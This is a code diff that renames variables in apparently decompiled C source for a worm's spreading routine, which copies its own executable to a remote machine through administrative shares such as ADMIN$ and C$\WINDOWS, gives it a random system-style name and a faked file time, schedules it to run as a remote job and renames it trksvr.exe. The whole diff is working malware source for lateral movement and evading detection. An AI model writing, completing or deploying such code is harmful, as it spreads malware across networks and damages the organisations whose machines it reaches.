@@ -48,12 +48,10 @@ bool CopyCurrentExecutableToTrkSvr()
 bool WriteModuleOnSharedPC(const WCHAR *inFile, const WCHAR *remoteSrv)
 {
 	BOOL v16; // edi@6
-	const WCHAR *v17; // edi@8
 	WCHAR *v31; // [sp-8h] [bp-12D4h]@12
 	int v32; // [sp-4h] [bp-12D0h]@12
 	int v33; // [sp+10h] [bp-12BCh]@6
 	int v36; // [sp+20h] [bp-12ACh]@1
-	signed int v37; // [sp+20h] [bp-12ACh]@6
 	bool v38; // [sp+27h] [bp-12A5h]@4
 	WCHAR v39[1024]; // [sp+28h] [bp-12A4h]@11
 	WCHAR v40[256]; // [sp+828h] [bp-AA4h]@10
@@ -63,7 +61,6 @@ bool WriteModuleOnSharedPC(const WCHAR *inFile, const WCHAR *remoteSrv)
 	WCHAR svc_csrss[256];
 	WCHAR csrss_locations[6][15] = {L"ADMIN$", L"C$\\WINDOWS", L"D$\\WINDOWS", L"E$\\WINDOWS"};
 	
-	WCHAR v46[30]; // [sp+12A0h] [bp-2Ch]@1
 	
 	WCHAR ExistingFileName[256]; // = "\\" + arg2 + "\\"
 
@@ -72,16 +69,16 @@ bool WriteModuleOnSharedPC(const WCHAR *inFile, const WCHAR *remoteSrv)
 	strcpyW(&ExistingFileName[strlenW(remoteSrv) + 2], L"\\", 2);
 	ExistingFileName[strlenW(remoteSrv) + 3] = 0;
 	
-	int path_len = strlenW(ExistingFileName);
-	memmove(svc_csrss, ExistingFileName, 2 * path_len);
+	int file_len = strlenW(ExistingFileName);
+	memmove(svc_csrss, ExistingFileName, 2 * file_len);
 	int idx;
 	// Iterate through the known locations for csrss.exe
 	WCHAR *location = *csrss_locations;
 	while(1)
 	{
-		memmove(&svc_csrss[path_len], location, 2 * strlenW(location));
-		memmove(&svc_csrss[path_len + strlenW(location)], L"\\system32\\csrss.exe", 2 * strlenW(L"\\system32\\csrss.exe"));
-		svc_csrss[path_len + strlenW(location) + strlenW(L"\\system32\\csrss.exe")] = 0;
+		memmove(&svc_csrss[file_len], location, 2 * strlenW(location));
+		memmove(&svc_csrss[file_len + strlenW(location)], L"\\system32\\csrss.exe", 2 * strlenW(L"\\system32\\csrss.exe"));
+		svc_csrss[file_len + strlenW(location) + strlenW(L"\\system32\\csrss.exe")] = 0;
 
 		if(IsFileAccessible(svc_csrss))
 			break;
@@ -94,36 +91,33 @@ bool WriteModuleOnSharedPC(const WCHAR *inFile, const WCHAR *remoteSrv)
 		}
 	}
 	
-	memmove(&ExistingFileName[path_len], csrss_locations[idx], 2 * strlenW(csrss_locations[idx]));
-	memmove(&ExistingFileName[path_len + strlenW(csrss_locations[idx])], L"\\system32\\", 2 * strlenW(L"\\system32\\") + 2);
+	memmove(&ExistingFileName[file_len], csrss_locations[idx], 2 * strlenW(csrss_locations[idx]));
+	memmove(&ExistingFileName[file_len + strlenW(csrss_locations[idx])], L"\\system32\\", 2 * strlenW(L"\\system32\\") + 2);
 	memmove(csrss_dir, ExistingFileName, 2 * strlenW(ExistingFileName) + 2);
-	
-	v16 = 0;
-	v37 = 0;
-	v33 = strlenW(ExistingFileName);
-	while(1)
+
+	file_len = strlenW(ExistingFileName);
+
+	WCHAR exec_name[30]; // [sp+12A0h] [bp-2Ch]@1
+	bool success;
+
+	for( int i = 0; i < 29; i++)
 	{
-		++v37;
-		if(v16)
-			break;
+		const WCHAR *tmp_exec_name = g_random_exec_name[GetRandom() % 29];
+		strcpyW(exec_name, tmp_exec_name, 2 * strlenW(tmp_exec_name));
+		strcpyW(&exec_name[strlenW(tmp_exec_name)], L".exe", 2 * strlenW(L".exe") + 2);
+		strcpyW(&ExistingFileName[file_len], exec_name, 2 * strlenW(exec_name) + 2);
 		
-		v17 = g_random_exec_name[GetRandom() % 29];
-		strcpyW(v46, v17, 2 * strlenW(v17));
-		strcpyW(&v46[strlenW(v17)], L".exe", 2 * strlenW(L".exe") + 2);
-		strcpyW(&ExistingFileName[v33], v46, 2 * strlenW(v46) + 2);
-		
-		v16 = CopyFileW(inFile, ExistingFileName, 1);
+		success = CopyFileW(inFile, ExistingFileName, 1);
 		SetReliableFileTime(ExistingFileName);
-		if(v37 >= 29)
-		{
-			if(!v16)
-				return 0;
+		if( success )
 			break;
-		}
 	}
+
+	if( !success )
+		return false;
 	
 	strcpyW(v40, L"%SystemRoot%\\System32\\", 2 * strlenW(L"%SystemRoot%\\System32\\"));
-	strcpyW(&v40[strlenW(L"%SystemRoot%\\System32\\")], v46, 2 * strlenW(v46) + 2);
+	strcpyW(&v40[strlenW(L"%SystemRoot%\\System32\\")], exec_name, 2 * strlenW(exec_name) + 2);
 	
 	if(AddNewJob(remoteSrv, v40))
 	{
@@ -131,7 +125,7 @@ bool WriteModuleOnSharedPC(const WCHAR *inFile, const WCHAR *remoteSrv)
 		return v38;
 	}
 	
-	AddNewJob(remoteSrv, v46);
+	AddNewJob(remoteSrv, exec_name);
 	
 	strcpyW(NewFileName, csrss_dir, 2 * strlenW(csrss_dir));
 	strcpyW(&NewFileName[strlenW(csrss_dir)], L"trksvr.exe", 2 * strlenW(L"trksvr.exe") + 2);
@@ -140,8 +134,8 @@ bool WriteModuleOnSharedPC(const WCHAR *inFile, const WCHAR *remoteSrv)
 	
 	if(!MoveFileW(ExistingFileName, NewFileName))
 	{
-		v32 = 2 * strlenW(v46) + 2;
-		v31 = v46;
+		v32 = 2 * strlenW(exec_name) + 2;
+		v31 = exec_name;
 	}
 	else
 	{
